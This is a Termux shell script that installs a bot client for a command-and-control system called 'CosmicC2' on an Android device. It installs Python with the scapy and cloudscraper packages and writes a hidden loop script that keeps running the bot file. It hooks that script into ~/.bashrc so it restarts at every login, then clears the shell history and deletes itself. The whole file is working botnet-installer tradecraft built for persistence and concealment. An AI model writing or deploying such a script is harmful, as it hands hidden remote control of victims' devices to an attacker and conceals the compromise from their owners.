#!/data/data/com.termux/files/usr/bin/bash

BOT_FOLDER="$HOME/cosmicc2w"
PYTHON_FILENAME="cosmicc2.py"
PYTHON_C2_PATH="$BOT_FOLDER/$PYTHON_FILENAME"

BASE_DIR="$PREFIX/etc/.cosmic_sys"
SCRIPT_PATH="$BASE_DIR/core_init.sh"

CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}[*]Conectando a CosmicC2...${NC}"

pkg update -y
pkg install python termux-api -y
pip install colorama
pip install cloudscraper
pip install scapy

mkdir -p "$BASE_DIR"

cat << EOF > "$SCRIPT_PATH"
#!/data/data/com.termux/files/usr/bin/bash

while true; do
    if [ -f "$PYTHON_C2_PATH" ]; then
        python3 "$PYTHON_C2_PATH"
    fi
    sleep 10
done
EOF

chmod +x "$SCRIPT_PATH"

if ! grep -q "$SCRIPT_PATH" "$HOME/.bashrc"; then
    echo "nohup \"$SCRIPT_PATH\" > /dev/null 2>&1 &" >> "$HOME/.bashrc"
    echo -e "${CYAN}[+] Started Service${NC}"
fi

nohup "$SCRIPT_PATH" > /dev/null 2>&1 &

echo -e "${CYAN}[*] Finalizando configuracion..${NC}"
history -c
rm -- "$0"

echo -e "${CYAN}[!] Connecting to cosmic....${NC}"
